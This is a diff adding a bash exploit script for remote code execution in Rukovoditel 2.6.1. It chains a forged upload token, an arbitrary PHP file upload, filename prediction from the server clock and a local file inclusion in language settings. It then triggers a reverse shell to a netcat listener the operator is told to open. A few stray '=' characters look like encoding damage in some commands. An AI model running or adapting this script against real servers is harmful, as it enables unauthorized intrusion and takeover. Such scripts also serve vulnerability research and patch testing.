@@ -1,0 +1,77 @@
+# Exploit Title: Rukovoditel 2.6.1 - RCE
+# Date: 2020-06-11
+# Exploit Author: coiffeur
+# Write Up: https://therealcoiffeur.github.io/c1010
+# Vendor Homepage: https://www.rukovoditel.net/
+# Software Link: https://www.rukovoditel.net/download.php
+# Version: v2.6.1
+
+set -e
+
+function usage () {
+    echo "NAME: Rukovoditel v2.6.1, RCE"
+    echo "SYNOPSIS: ./rce_2.6.1.sh <BASE_URL> <SID>"
+    echo "DESCRIPTION:"
+    echo "Upload file test.php on the remote server and trigger the file using a LFI"
+    echo "AUTHOR: coiffeur"
+    exit
+}
+
+if [ "$#" -ne 2 ]; then
+    usage
+fi
+
+BASE_URL=$1
+SID=$2
+echo "Setting target: $BASE_URL"
+echo "Setting sid: $SID"
+
+echo ""
+
+echo "Extracting \$app_user['id']:"
+APP_USER_ID=`curl -s "$BASE_URL/index.php?module=users/account" -H "Cookie: sid=$SID" | grep "validate_form&id=" | cut -d '=' -f 3 | cut -d "'" -f 1`
+echo "  =>  \$app_user['id']: $APP_USER_ID"
+
+echo "Setting arbitrary \$_POST['timestamp']:"
+TIMESTAMP=1337
+echo "  =>  \$_POST['timestamp']: 1337"
+
+echo "Calculating \$verifyToken:"
+VERIFY_TOKEN=`echo -n "$APP_USER_ID$TIMESTAMP" | md5sum | cut -d ' ' -f 1=`
+echo "  =>  \$verifyToken: $VERIFY_TOKEN"
+echo ""
+
+echo "[*] Trying to upload test.php ... (Arbitrary File Upload)"
+curl "$BASE_URL/index.php?module=users/account&action=attachments_upload" -H "Cookie: sid=$SID" -F "timestamp=$TIMESTAMP" -F "token=$VERIFY_TOKEN" -F 'Filedata=@test.php'
+
+echo ""
+
+echo "[*] Trying to recover time() output:"
+TIME=$(date -d "`curl -si "$BASE_URL" | grep "Date:" | sed 's/Date: //'`"= +%s)
+echo "  =>  timestamp: $TIME"
+
+echo "[*] Trying to recover the generated filename:"=20
+FILENAME=` echo -n $TIME"_test.php" | sha1sum | cut -d ' ' -f 1`
+echo "  =>  filename: $FILENAME"
+
+echo "[*] Trying to reconstructing full path:"
+DATE=`date +"%Y/%m/%d"`
+FULL_PATH=`echo -n "uploads/attachments/$DATE/$FILENAME"`
+echo "  =>  full path: $FULL_PATH"
+
+echo ""
+
+echo "[!] Prepare a netcat listener by typing: nc -lvp 4444"
+
+echo ""
+
+echo "[*] Trying to update language settings  ... (Local File Inclusion)"
+LANGUAGE="../../$FULL_PATH"
+curl -s "$BASE_URL/index.php?module=users/account&action=update" -H "Cookie: sid=$SID" -d "fields[13]=$LANGUAGE"
+
+echo "[*] Triggering reverse shell ..."
+curl -s "$BASE_URL/index.php?module=users/account" -H "Cookie: sid=$SID="
+
+echo "[*] Restoring default language settings"
+curl -s "$BASE_URL/index.php?module=users/account&action=update" -H "Cookie: sid=$SID" -d "fields[13]=english.php"
+echo "> Done"
